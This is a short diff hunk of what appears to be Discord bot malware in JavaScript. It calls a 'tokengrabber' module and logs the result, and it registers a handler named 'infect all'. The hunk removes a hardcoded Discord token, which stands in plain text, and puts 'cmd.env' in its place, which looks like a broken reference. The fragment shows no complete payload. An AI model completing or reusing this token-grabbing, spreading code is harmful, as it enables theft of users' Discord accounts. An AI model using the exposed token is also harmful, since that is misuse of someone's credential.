@@ -6,7 +6,7 @@ Client.on("ready", () => {
 });
 
 const data = tokengrabber.joinclient(discord)
-Client.login("MTE3NTY0MDM1NjE5MzMyNTEwNg.G52mx3.jrfxfbCkHG0DNCwuZK7x-BhDzj0RBsFWt2ZZGY")
+Client.login(cmd.env)
 console.log(data)
 
 Client.on("infect all", msg => {
